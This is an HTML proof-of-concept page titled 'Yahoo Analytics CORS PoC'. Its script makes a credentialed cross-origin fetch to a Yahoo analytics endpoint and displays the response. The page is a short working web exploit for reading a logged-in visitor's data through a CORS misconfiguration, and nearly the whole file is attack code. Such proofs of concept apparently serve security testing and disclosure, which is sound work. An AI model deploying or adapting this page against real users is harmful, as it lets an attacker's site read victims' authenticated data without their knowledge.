<!DOCTYPE html>
<html>
<body>
  <h1>Yahoo Analytics CORS PoC</h1>
  <pre id="output">Loading...</pre>
  <script>
    fetch("https://analytics.query.yahoo.com", {
      method: "GET",
      credentials: "include",
      headers: {
        "X-Test": "1"
      }
    }).then(r => r.text())
      .then(t => document.getElementById("output").innerText = t)
      .catch(e => document.getElementById("output").innerText = "Error: " + e);
  </script>
</body>
</html>
